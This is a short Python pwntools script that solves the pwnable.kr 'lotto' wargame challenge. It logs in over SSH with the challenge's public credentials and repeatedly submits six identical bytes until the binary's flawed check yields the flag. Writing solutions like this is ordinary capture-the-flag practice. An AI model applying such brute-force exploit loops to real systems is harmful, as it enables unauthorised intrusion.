#!/usr/bin/env python
import pwn

buffer_size = 1024

ssh = pwn.ssh(host='pwnable.kr', user='lotto', password='guest', port=2222)
attack = ssh.process(executable='./lotto')
attack.recvuntil("3. Exit\n")

while True:
	attack.sendline("1")
	attack.recvuntil("Submit your 6 lotto bytes : ")
	attack.sendline("!!!!!!")
	data = attack.recvuntil("3. Exit\n")
	# print data
	if "bad luck..." in data:
		pass
	else:
		print data
		break
